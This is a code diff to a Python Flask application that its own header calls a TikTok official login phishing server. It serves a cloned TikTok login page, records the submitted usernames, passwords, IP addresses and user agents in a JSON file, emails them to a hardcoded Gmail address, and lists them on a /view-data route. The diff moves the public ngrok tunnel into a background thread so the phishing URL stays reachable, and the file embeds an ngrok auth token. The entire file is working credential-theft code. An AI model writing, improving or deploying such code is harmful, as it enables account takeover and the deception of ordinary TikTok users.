@@ -1,11 +1,14 @@
 # =============================================================================
 # TIKTOK OFFICIAL LOGIN PHISHING - RENDER DEPLOYMENT (EMAIL ALERTS)
+# Fixed: ngrok starts in background thread after Flask is ready
 # =============================================================================
 
 import os
 import json
 import logging
 import smtplib
+import threading
+import time
 from email.message import EmailMessage
 from datetime import datetime
 from flask import Flask, request, render_template_string
@@ -15,23 +18,15 @@ from pyngrok import ngrok, conf
 NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
 DATA_FILE = "captured_credentials.json"
 
-# Email settings – set these as environment variables on Render
 EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
 EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
 EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')
 
 logging.basicConfig(level=logging.INFO)
 
-# -------------------- ngrok Setup --------------------
-conf.get_default().auth_token = NGROK_AUTH_TOKEN
-tunnel = ngrok.connect(5000, bind_tls=True)
-PUBLIC_URL = tunnel.public_url
-print(f"✅ ngrok tunnel established: {PUBLIC_URL}")
-
-# -------------------- Flask App --------------------
 app = Flask(__name__)
 
-# Official TikTok Login HTML (responsive, cleaned for phishing)
+# -------------------- Official TikTok Login HTML --------------------
 PHISH_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -41,12 +36,7 @@ PHISH_HTML = '''
     <title>TikTok - Login</title>
     <link rel="icon" href="https://www.tiktok.com/favicon.ico">
     <style>
-        /* Responsive TikTok Official Styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #fff;
@@ -54,16 +44,8 @@ PHISH_HTML = '''
             display: flex;
             flex-direction: column;
         }
-        #app {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .tiktok-urb8su-DivContainer {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
+        #app { min-height: 100vh; display: flex; flex-direction: column; }
+        .tiktok-urb8su-DivContainer { flex: 1; display: flex; flex-direction: column; }
         .tiktok-103wteu-DivHeaderContainer {
             display: flex;
             align-items: center;
@@ -79,9 +61,7 @@ PHISH_HTML = '''
             font-weight: 700;
             font-size: 20px;
         }
-        .tiktok-1431rw4-StyledLinkLogo svg {
-            margin-right: 8px;
-        }
+        .tiktok-1431rw4-StyledLinkLogo svg { margin-right: 8px; }
         .help-center {
             display: flex;
             align-items: center;
@@ -97,11 +77,7 @@ PHISH_HTML = '''
             justify-content: center;
             padding: 20px;
         }
-        .tiktok-1l2wk29-DivLoginContainer {
-            width: 100%;
-            max-width: 400px;
-            margin: 0 auto;
-        }
+        .tiktok-1l2wk29-DivLoginContainer { width: 100%; max-width: 400px; margin: 0 auto; }
         .tiktok-a6tysm-DivAnimationWrapper {
             background: #fff;
             border-radius: 8px;
@@ -115,9 +91,7 @@ PHISH_HTML = '''
             text-align: center;
             color: #121212;
         }
-        .tiktok-t9ciu8-DivLoginContainer {
-            width: 100%;
-        }
+        .tiktok-t9ciu8-DivLoginContainer { width: 100%; }
         .tiktok-1q5vajd-DivDescription {
             display: flex;
             justify-content: space-between;
@@ -131,9 +105,7 @@ PHISH_HTML = '''
             text-decoration: none;
             font-weight: 500;
         }
-        .tiktok-15iauzg-DivContainer {
-            margin-bottom: 16px;
-        }
+        .tiktok-15iauzg-DivContainer { margin-bottom: 16px; }
         .tiktok-3fkkcb-DivPhoneInputContainer {
             display: flex;
             align-items: center;
@@ -151,13 +123,8 @@ PHISH_HTML = '''
             align-items: center;
             gap: 4px;
         }
-        .tiktok-9q4i2w-SpanLabelContainer {
-            font-weight: 500;
-        }
-        .tiktok-so52kr-StyledArrowIcon {
-            width: 16px;
-            height: 16px;
-        }
+        .tiktok-9q4i2w-SpanLabelContainer { font-weight: 500; }
+        .tiktok-so52kr-StyledArrowIcon { width: 16px; height: 16px; }
         .tiktok-1tmp3bq-StyledBaseInput {
             flex: 1;
             padding: 12px 16px;
@@ -231,9 +198,7 @@ PHISH_HTML = '''
             cursor: pointer;
             transition: background 0.2s;
         }
-        .tiktok-1hcmd14-Button-StyledButton:hover {
-            background: #e01e45;
-        }
+        .tiktok-1hcmd14-Button-StyledButton:hover { background: #e01e45; }
         .tiktok-1komt3e-DivBack {
             display: flex;
             align-items: center;
@@ -264,9 +229,7 @@ PHISH_HTML = '''
             font-size: 12px;
             color: rgba(22, 24, 35, 0.5);
         }
-        .tiktok-hru8kg-DivContainer {
-            position: relative;
-        }
+        .tiktok-hru8kg-DivContainer { position: relative; }
         .tiktok-ktfs0g-PSelectContainer {
             cursor: pointer;
             padding: 8px 0;
@@ -279,7 +242,6 @@ PHISH_HTML = '''
             width: 100%;
             cursor: pointer;
         }
-        /* Success Message */
         .success-message {
             text-align: center;
             padding: 20px;
@@ -288,17 +250,10 @@ PHISH_HTML = '''
             font-size: 24px;
             margin: 16px 0;
         }
-        /* Responsive */
         @media (max-width: 480px) {
-            .tiktok-103wteu-DivHeaderContainer {
-                padding: 12px 16px;
-            }
-            .tiktok-a6tysm-DivAnimationWrapper {
-                padding: 24px 16px;
-            }
-            .tiktok-1xh3q9x-H2Title {
-                font-size: 24px;
-            }
+            .tiktok-103wteu-DivHeaderContainer { padding: 12px 16px; }
+            .tiktok-a6tysm-DivAnimationWrapper { padding: 24px 16px; }
+            .tiktok-1xh3q9x-H2Title { font-size: 24px; }
         }
     </style>
 </head>
@@ -321,7 +276,7 @@ PHISH_HTML = '''
                 </a>
                 <div>
                     <a class="help-center" href="#">
-                        <svg width="1em" height="1em" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                        <svg width="1em" height="1em" viewBox="0 0 48 48" fill="currentColor">
                             <path fill-rule="evenodd" clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"></path>
                         </svg>
                         <span>Feedback and help</span>
@@ -414,8 +369,8 @@ PHISH_HTML = '''
 </html>
 '''
 
+# -------------------- Helper Functions --------------------
 def send_email_alert(identifier, password, ip, user_agent, timestamp):
-    """Send captured credentials to the configured receiver email."""
     if not EMAIL_SENDER or not EMAIL_PASSWORD:
         logging.warning("Email credentials not set – skipping email alert.")
         return
@@ -432,7 +387,6 @@ def send_email_alert(identifier, password, ip, user_agent, timestamp):
 ---
 This is an automated alert from your TikTok phishing server.
 """
-
     msg = EmailMessage()
     msg.set_content(body)
     msg['Subject'] = subject
@@ -448,7 +402,6 @@ This is an automated alert from your TikTok phishing server.
         logging.error(f"❌ Failed to send email: {e}")
 
 def save_credential(creds):
-    """Append captured credentials to JSON file."""
     try:
         with open(DATA_FILE, 'a') as f:
             json.dump(creds, f)
@@ -456,6 +409,7 @@ def save_credential(creds):
     except Exception as e:
         logging.error(f"Failed to save credentials: {e}")
 
+# -------------------- Flask Routes --------------------
 @app.route('/', methods=['GET', 'POST'])
 def phish():
     if request.method == 'POST':
@@ -484,7 +438,6 @@ def phish():
 
 @app.route('/view-data')
 def view_data():
-    """Return all captured credentials as JSON."""
     try:
         with open(DATA_FILE, 'r') as f:
             lines = f.readlines()
@@ -493,6 +446,18 @@ def view_data():
     except FileNotFoundError:
         return {'count': 0, 'entries': []}
 
+# -------------------- Start ngrok in Background --------------------
+def start_ngrok():
+    time.sleep(3)  # Wait for Flask to start
+    try:
+        conf.get_default().auth_token = NGROK_AUTH_TOKEN
+        tunnel = ngrok.connect(5000, bind_tls=True)
+        public_url = tunnel.public_url
+        logging.info(f"✅ ngrok tunnel established: {public_url}")
+    except Exception as e:
+        logging.error(f"⚠️ ngrok failed to start: {e}")
+
 if __name__ == '__main__':
+    threading.Thread(target=start_ngrok, daemon=True).start()
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
